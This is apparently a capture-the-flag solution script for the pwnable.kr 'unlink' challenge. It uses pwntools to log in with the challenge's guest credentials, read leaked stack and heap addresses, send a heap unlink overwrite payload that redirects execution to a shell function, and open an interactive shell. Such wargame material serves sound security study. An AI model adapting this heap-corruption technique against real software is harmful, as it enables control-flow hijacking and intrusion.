from pwn import *

s =  ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
r = s.process('./unlink')
leak = r.recvuntil('shell!\n')
stack = int(leak.split('leak: 0x')[1][:8], 16)
heap = int(leak.split('leak: 0x')[2][:8], 16)
shell = 0x80484eb
payload = p32(shell)        # heap + 8  (new ret addr)
payload += p32(heap + 12)    # heap + 12 (this -4 becomes ESP at ret)
payload += '3333'        # heap + 16
payload += '4444'
payload += p32(stack - 0x20)    # eax. (address of old ebp of unlink) -4
payload += p32(heap + 16)    # edx.
r.sendline( payload )
r.interactive()
